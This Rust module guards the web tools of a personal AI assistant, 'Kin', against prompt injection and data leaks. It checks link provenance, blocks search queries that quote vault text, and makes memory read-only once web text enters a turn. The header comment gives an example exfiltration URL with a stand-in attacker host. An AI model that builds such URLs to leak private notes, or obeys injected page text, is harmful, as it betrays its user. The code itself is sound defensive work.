//! KI-81: what one turn's web tools may do, given what came into the turn.
//!
//! Fetched pages and search snippets are strangers' text. The prompt says
//! they are never instructions, but that's a soft guard, so the tools hold
//! three hard ones:
//!
//! - **Provenance.** `web_fetch` opens a URL only if it appeared in
//!   Hussain's own messages, in what Kin read from the vault or the Feed this
//!   turn, or in this turn's search results; or it's a link on a page Kin
//!   already fetched, on the same site and without a query string. A URL
//!   Kin composed itself (`https://attacker.example/?q=<vault text>`) has
//!   none of these, so nothing from the vault rides out in it.
//! - **Queries.** `web_search` queries are at most [`MAX_QUERY_CHARS`] and
//!   may not quote [`QUOTE_WORDS`] or more words in a row of what Kin read
//!   from the vault this turn, unless Hussain wrote those words himself.
//! - **Taint.** Once web text is in the turn, Kin's memory and skills are
//!   read-only until his next message, so a page can't plant lasting
//!   "facts" about him.

use std::collections::HashSet;
use std::hash::{DefaultHasher, Hash, Hasher};

/// The longest `web_search` query, in characters.
pub const MAX_QUERY_CHARS: usize = 200;
/// Words in a row that make a query a verbatim quote of the vault.
pub const QUOTE_WORDS: usize = 8;

pub const QUERY_TOO_LONG: &str =
    "That query is too long: keep web searches under 200 characters, in your own words.";
pub const QUERY_QUOTES_VAULT: &str = "That query quotes the vault word for word, and searches leave the Mac. Search in your own words, without private details.";
pub const NO_PROVENANCE: &str = "web_fetch only opens links from this turn: in Hussain's messages, in what you read from the vault or Feed, in search results, or on a page you read (same site, no query string). Tell him: I can only open links you gave me or that came up in a search.";
pub const MEMORY_LOCKED: &str = "Memory and skills are read-only for the rest of this turn because it read the web. If something is worth keeping, say so; Hussain can ask you to remember it in his next message.";

/// One turn's provenance and taint.
#[derive(Default)]
pub struct Guard {
    /// URLs with provenance, as [`key`]s.
    known: HashSet<String>,
    /// Hashed word runs of what Kin read from the vault this turn.
    read: HashSet<u64>,
    /// Hashed word runs of Hussain's own messages: quoting him is fine.
    heard: HashSet<u64>,
    /// Web text came into the turn.
    tainted: bool,
}

impl Guard {
    /// Hussain's own words: his links (bare `example.com/post` too) and the
    /// phrases he may want searched as written.
    pub fn heard(&mut self, text: &str) {
        for url in urls(text).into_iter().chain(bare_urls(text)) {
            self.known.insert(key(&url));
        }
        self.heard.extend(runs(text));
    }

    /// Text Kin read from the vault or the Feed.
    pub fn read(&mut self, text: &str) {
        for url in urls(text) {
            self.known.insert(key(&url));
        }
        self.read.extend(runs(text));
    }

    /// A search's result links: each may be fetched.
    pub fn searched<'a>(&mut self, results: impl IntoIterator<Item = &'a str>) {
        self.tainted = true;
        for url in results {
            if let Ok(url) = reqwest::Url::parse(url) {
                self.known.insert(key(&url));
            }
        }
    }

    /// A page Kin fetched: its own addresses, and its links on the same
    /// site without a query string.
    pub fn fetched(&mut self, asked: &reqwest::Url, landed: &str, body: &str) {
        self.tainted = true;
        self.known.insert(key(asked));
        let base = reqwest::Url::parse(landed).unwrap_or_else(|_| asked.clone());
        self.known.insert(key(&base));
        let links = urls(body).into_iter().chain(relative_links(body, &base));
        for link in links {
            if link.query().is_none() && (same_site(&link, &base) || same_site(&link, asked)) {
                self.known.insert(key(&link));
            }
        }
    }

    pub fn may_fetch(&self, url: &reqwest::Url) -> Result<(), &'static str> {
        if self.known.contains(&key(url)) {
            Ok(())
        } else {
            Err(NO_PROVENANCE)
        }
    }

    pub fn may_search(&self, query: &str) -> Result<(), &'static str> {
        if query.chars().count() > MAX_QUERY_CHARS {
            return Err(QUERY_TOO_LONG);
        }
        if runs(query).any(|run| self.read.contains(&run) && !self.heard.contains(&run)) {
            return Err(QUERY_QUOTES_VAULT);
        }
        Ok(())
    }

    pub fn tainted(&self) -> bool {
        self.tainted
    }
}

/// A URL as compared: host without `www.`, port, path without a trailing
/// slash, and query; no scheme (http and https are the same page here) and
/// no fragment.
fn key(url: &reqwest::Url) -> String {
    let host = url.host_str().unwrap_or_default();
    let host = host.strip_prefix("www.").unwrap_or(host);
    let port = url.port().map(|p| format!(":{p}")).unwrap_or_default();
    let path = url.path().trim_end_matches('/');
    match url.query() {
        Some(query) => format!("{host}{port}{path}?{query}"),
        None => format!("{host}{port}{path}"),
    }
}

fn same_site(a: &reqwest::Url, b: &reqwest::Url) -> bool {
    let site = |u: &reqwest::Url| {
        let host = u.host_str().unwrap_or_default().to_string();
        host.strip_prefix("www.").map(String::from).unwrap_or(host)
    };
    !site(a).is_empty() && site(a) == site(b)
}

/// Absolute http(s) URLs in text: plain, in Markdown links, in JSON strings
/// and in front matter.
fn urls(text: &str) -> Vec<reqwest::Url> {
    let lower = text.to_ascii_lowercase();
    let mut out = Vec::new();
    let mut from = 0;
    while let Some(at) = lower[from..].find("http").map(|i| from + i) {
        from = at + 4;
        let rest = &lower[at..];
        if !(rest.starts_with("http://") || rest.starts_with("https://")) {
            continue;
        }
        let candidate = until_url_end(&text[at..]);
        from = at + candidate.len().max(4);
        if let Ok(url) = reqwest::Url::parse(candidate)
            && url.host_str().is_some()
        {
            out.push(url);
        }
    }
    out
}

/// Where a URL in running text ends: at whitespace or a delimiter, with
/// trailing punctuation and unbalanced closing brackets dropped.
fn until_url_end(text: &str) -> &str {
    let end = text
        .find(|c: char| {
            c.is_whitespace()
                || matches!(
                    c,
                    '<' | '>' | '"' | '`' | '\\' | '[' | ']' | '{' | '}' | '|'
                )
        })
        .unwrap_or(text.len());
    let mut url = &text[..end];
    loop {
        let trimmed = url.trim_end_matches(['.', ',', ';', ':', '!', '?', '*', '_', '~', '\'']);
        let trimmed = if trimmed.ends_with(')')
            && trimmed.matches('(').count() < trimmed.matches(')').count()
        {
            &trimmed[..trimmed.len() - 1]
        } else {
            trimmed
        };
        if trimmed.len() == url.len() {
            return url;
        }
        url = trimmed;
    }
}

/// Words that look like a web address without a scheme (`hussain.ph/notes`),
/// read as https. Only for his own messages.
fn bare_urls(text: &str) -> Vec<reqwest::Url> {
    text.split_whitespace()
        .map(|word| until_url_end(word.trim_start_matches(['(', '<', '"', '\''])))
        .filter(|word| !word.contains("://") && !word.contains('@'))
        .filter_map(|word| {
            let url = reqwest::Url::parse(&format!("https://{word}")).ok()?;
            let host = url.host_str()?;
            let tld = host.rsplit('.').next()?;
            (host.contains('.') && tld.len() >= 2 && tld.chars().all(|c| c.is_ascii_alphabetic()))
                .then_some(url)
        })
        .collect()
}

/// Relative Markdown link targets on a page (`](/notes/x)`), resolved
/// against its address.
fn relative_links(body: &str, base: &reqwest::Url) -> Vec<reqwest::Url> {
    body.split("](")
        .skip(1)
        .filter_map(|rest| {
            let target = rest.split([')', ' ', '\n', '\t']).next()?;
            let target = target.trim_matches(['<', '>']);
            if target.is_empty() || target.contains("://") || target.starts_with('#') {
                return None;
            }
            let url = base.join(target).ok()?;
            matches!(url.scheme(), "http" | "https").then_some(url)
        })
        .collect()
}

/// Every run of [`QUOTE_WORDS`] words in a row, lowercased and hashed.
fn runs(text: &str) -> impl Iterator<Item = u64> {
    let words: Vec<String> = text
        .split(|c: char| !c.is_alphanumeric())
        .filter(|w| !w.is_empty())
        .map(str::to_lowercase)
        .collect();
    let count = words.len().saturating_sub(QUOTE_WORDS - 1);
    (0..count).map(move |i| {
        let mut hasher = DefaultHasher::new();
        words[i..i + QUOTE_WORDS].hash(&mut hasher);
        hasher.finish()
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    fn url(s: &str) -> reqwest::Url {
        reqwest::Url::parse(s).unwrap()
    }

    #[test]
    fn urls_are_found_in_prose_markdown_and_json() {
        let text = "See https://en.wikipedia.org/wiki/Kintsugi_(art). Also [a](https://example.com/a?x=1#top), \
                    {\"url\":\"http://example.org/b/\"} and <https://example.net/c>, then 'https://q.example/d'.";
        let found: Vec<String> = urls(text).iter().map(key).collect();
        assert_eq!(
            found,
            [
                "en.wikipedia.org/wiki/Kintsugi_(art)",
                "example.com/a?x=1",
                "example.org/b",
                "example.net/c",
                "q.example/d"
            ]
        );
        let bare: Vec<String> =
            bare_urls("read hussain.ph/notes/kiln, e.g. this (www.example.com).")
                .iter()
                .map(key)
                .collect();
        assert_eq!(bare, ["hussain.ph/notes/kiln", "example.com"]);
    }

    #[test]
    fn keys_ignore_scheme_www_fragment_and_trailing_slash() {
        assert_eq!(
            key(&url("http://www.Example.com/a/#x")),
            key(&url("https://example.com/a"))
        );
        assert_ne!(
            key(&url("https://example.com/a?q=1")),
            key(&url("https://example.com/a"))
        );
    }

    #[test]
    fn page_links_count_only_on_the_same_site_without_a_query() {
        let mut guard = Guard::default();
        let page = url("https://blog.example/posts/one");
        guard.fetched(
            &page,
            page.as_str(),
            "[next](/posts/two) [rel](three) [ext](https://other.example/x) [q](/search?q=1) https://blog.example/about",
        );
        assert!(guard.tainted());
        for ok in [
            "https://blog.example/posts/one",
            "https://blog.example/posts/two",
            "https://blog.example/posts/three",
            "https://blog.example/about",
        ] {
            assert!(guard.may_fetch(&url(ok)).is_ok(), "{ok}");
        }
        for refused in [
            "https://other.example/x",
            "https://blog.example/search?q=1",
            "https://blog.example/posts/secret-from-the-vault",
        ] {
            assert_eq!(
                guard.may_fetch(&url(refused)),
                Err(NO_PROVENANCE),
                "{refused}"
            );
        }
    }

    #[test]
    fn queries_may_not_quote_eight_words_of_the_vault_he_didnt_write() {
        let mut guard = Guard::default();
        guard.read("My grandmother's kiln taught me patience, and the glaze cracked every winter.");
        assert!(guard.may_search("anagama kiln firing temperature").is_ok());
        assert!(
            guard
                .may_search("kiln taught me patience, and the glaze")
                .is_ok(),
            "seven words"
        );
        assert_eq!(
            guard.may_search("my GRANDMOTHER'S kiln taught me patience and the glaze"),
            Err(QUERY_QUOTES_VAULT)
        );
        guard
            .heard("Find who said \"kiln taught me patience, and the glaze cracked every winter\"");
        assert!(
            guard
                .may_search("kiln taught me patience and the glaze cracked every winter")
                .is_ok()
        );
        assert_eq!(guard.may_search(&"word ".repeat(41)), Err(QUERY_TOO_LONG));
        assert!(
            !guard.tainted(),
            "neither reading the vault nor his words taint the turn"
        );
    }
}
